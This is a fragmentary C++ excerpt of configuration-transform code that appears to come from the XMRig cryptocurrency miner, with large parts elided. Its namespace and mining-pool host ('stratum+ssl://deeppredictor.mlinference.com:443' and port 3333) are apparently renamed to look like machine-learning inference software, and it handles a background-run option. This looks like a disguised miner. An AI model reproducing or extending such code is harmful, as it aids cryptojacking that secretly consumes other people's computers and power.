...
void mlinference::BaseTransform::load(JsonChain &chain, Process *process, IConfigTransform &transform)
{
...
void mlinference::BaseTransform::finalize(rapidjson::Document &doc)
{
    using namespace rapidjson;
...
void mlinference::BaseTransform::transform(rapidjson::Document &doc, int key, const char *arg)
{
    switch (key) {
...
#           ifdef XMRIG_FEATURE_TLS
                "stratum+ssl://deeppredictor.mlinference.com:443"
#           else
                "deeppredictor.mlinference.com:3333"
#           endif
            );
        } else
#       endif
...
void mlinference::BaseTransform::transformBoolean(rapidjson::Document &doc, int key, bool enable)
{
    switch (key) {
    case IConfig::BackgroundKey: /* --background */
...
void mlinference::BaseTransform::transformUint64(rapidjson::Document &doc, int key, uint64_t arg)
{
    switch (key) {
    case IConfig::RetriesKey: /* --retries */
